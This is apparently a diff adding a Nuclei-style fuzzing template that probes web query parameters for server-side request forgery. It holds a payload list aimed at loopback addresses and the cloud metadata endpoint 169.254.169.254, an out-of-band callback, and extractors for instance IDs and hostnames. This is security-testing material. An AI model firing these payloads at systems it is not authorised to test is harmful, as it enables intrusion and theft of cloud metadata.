@@ -1,0 +1,59 @@
+http:
+- extractors:
+  - part: body
+    regex:
+    - (i-[a-z0-9]{8,})
+    - (ami-[a-z0-9]{8,})
+    - (?:instance-id|hostname):?\s*([\w.-]+)
+    type: regex
+  fuzzing:
+  - fuzz:
+    - '{{ssrf}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - condition: or
+    part: header
+    type: word
+    words:
+    - '169.254'
+    - 127.0.0.1
+    - localhost
+    - '{{interactsh-url}}'
+  - condition: or
+    part: body
+    regex:
+    - (?i)(EC2|meta-data|hostname|instance-id|root)
+    - (127\.0\.0\.1|169\.254\.169\.254|localhost|internal)
+    - (Connection refused|Unexpected error|Connection timed out)
+    type: regex
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    ssrf:
+    - http://127.0.0.1:80
+    - http://127.0.0.1:8000
+    - http://127.0.0.1:8080
+    - http://localhost
+    - http://0.0.0.0
+    - http://169.254.169.254
+    - http://169.254.169.254/latest/meta-data/
+    - http://[::1]
+    - http://127.1.2.3
+    - http://{{interactsh-url}}
+  redirects: true
+  stop-at-first-match: true
+id: ai-fuzz-ssrf-redirect
+info:
+  author: openai
+  name: SSRF via URL Injection (Redirect & Metadata)
+  severity: high
+  tags: ssrf,fuzzing,oob,redirect,cloud,dast
